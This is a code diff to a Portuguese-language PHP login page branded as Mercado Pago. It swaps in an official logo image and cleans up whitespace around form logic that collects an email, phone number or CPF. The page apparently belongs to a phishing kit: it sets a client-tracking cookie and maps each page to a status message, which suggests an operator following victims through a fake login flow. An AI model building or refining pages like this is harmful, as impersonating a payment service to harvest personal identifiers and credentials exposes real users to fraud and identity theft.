@@ -59,7 +59,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 </head>
 <body>
     <header class="main-header">
-        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
+        <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" alt="Mercado Pago">
     </header>
 
     <main class="main-content">
@@ -108,7 +108,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         const submitBtn = loginForm.querySelector('.btn-continue');
 
         // --- BLOCO DA MÁSCARA DE INPUT FOI REMOVIDO ---
-        
+
         // --- FUNÇÕES DE VALIDAÇÃO (INALTERADAS) ---
         const isValidEmail = (email) => {
             const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
@@ -117,7 +117,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
         const isValidCPF = (cpf) => {
             cpf = cpf.replace(/\D/g, ''); // Remove formatação
-            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false; 
+            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
             let sum = 0, rest;
             for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
             rest = (sum * 10) % 11;
@@ -146,7 +146,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                 errorDiv.textContent = 'Informe seu e-mail, telefone ou CPF.';
                 return;
             }
-            
+
             let eValido = false;
             const apenasNumeros = valor.replace(/\D/g, '');
 
@@ -162,7 +162,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
                 errorDiv.textContent = 'Por favor, informe um dado válido.';
                 return;
             }
-            
+
             submitBtn.disabled = true;
             submitBtn.textContent = 'Aguarde...';
 
@@ -216,7 +216,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
 
             // Descobre o nome do arquivo da página atual
             const currentPage = window.location.pathname.split('/').pop() || 'index.php';
-            
+
             // Pega a mensagem de status correspondente
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
